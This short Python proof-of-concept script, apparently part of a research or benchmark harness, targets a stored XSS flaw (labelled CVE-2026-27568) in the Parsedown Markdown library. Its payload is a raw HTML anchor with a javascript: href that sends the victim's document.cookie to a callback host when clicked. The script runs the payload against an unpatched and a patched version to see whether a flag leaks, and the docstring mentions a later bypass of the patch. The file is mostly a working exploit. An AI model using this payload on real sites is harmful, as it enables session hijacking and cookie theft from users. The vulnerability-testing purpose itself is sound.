#!/usr/bin/env python3
"""[GIVEN] CVE-2026-27568 seed exploit — raw-HTML <a href='javascript:...'> stored XSS.

On V0 (pre-27568, plain Parsedown) the raw anchor passes verbatim, the victim's click executes
the javascript: href, and the flag is exfiltrated. On V1 (=27568-patched: ParsedownSafeWithLinks
inlineMarkup()/sanitizeATag() scheme-whitelist) the javascript: href is blanked -> <a>CLICKME</a>
-> click no-op -> BLOCKED (no flag). This is the guard CVE-2026-33500 later bypasses.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from poc_common import run_payload, CB  # noqa: E402

# Raw HTML anchor. Single-quoted href so the sanitizer's whitelist runs on the true javascript:
# scheme; the exfil JS uses double quotes and reads the victim's document.cookie.
ORIGINAL_PAYLOAD = (
    "<a href='javascript:document.location=\"" + CB + "\"+document.cookie'>CLICKME</a>"
)


def original_poc(*, version="v1"):
    """Run the CVE1 seed on `version`; returns the callback dump (flag present IFF it executed)."""
    return run_payload(ORIGINAL_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(original_poc(version=v))
